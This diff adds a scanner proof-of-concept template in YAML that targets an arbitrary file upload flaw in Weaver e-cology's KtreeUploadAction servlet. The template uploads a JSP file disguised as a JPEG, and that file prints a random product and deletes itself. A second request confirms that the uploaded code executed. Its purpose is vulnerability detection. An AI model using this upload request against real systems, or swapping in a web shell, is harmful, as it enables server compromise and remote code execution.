@@ -1,0 +1,35 @@
+name: poc-yaml-ecology-ktreeuploadaction-upload
+manual: true
+transport: http
+set:
+  s1: randomInt(40000, 44800)
+  s2: randomInt(40000, 44800)
+  rboundary: randomLowercase(8)
+  randname: randomLowercase(6)
+rules:
+  r0:
+    request:
+      cache: true
+      method: POST
+      path: /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"test\"; filename=\"{{randname}}.jsp\"\r\nContent-Type: image/jpeg\r\n\r\n<%out.print({{s1}} * {{s2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
+    expression: response.status == 200 && response.body.bcontains(b"SUCCESS")
+    output:
+      search: |
+        ",'url':'/(?P<furl>.*?.jsp)',".bsubmatch(response.body)
+      furl: search["furl"]
+  r1:
+    request:
+      cache: true
+      method: GET
+      path: /{{furl}}
+    expression: response.status == 200 && response.body.bcontains(bytes(string(s1 * s2)))
+
+expression: r0() && r1()
+# expression: r1() 
+detail:
+  author: klear
+  links:
+    - https://github.com/WingsSec/Meppo/blob/139819ec08bc0312a69c751aa99e87f218d8be8b/Moudle/Weaver/Weaver_e_cology_KtreeUploadAction.py#L12
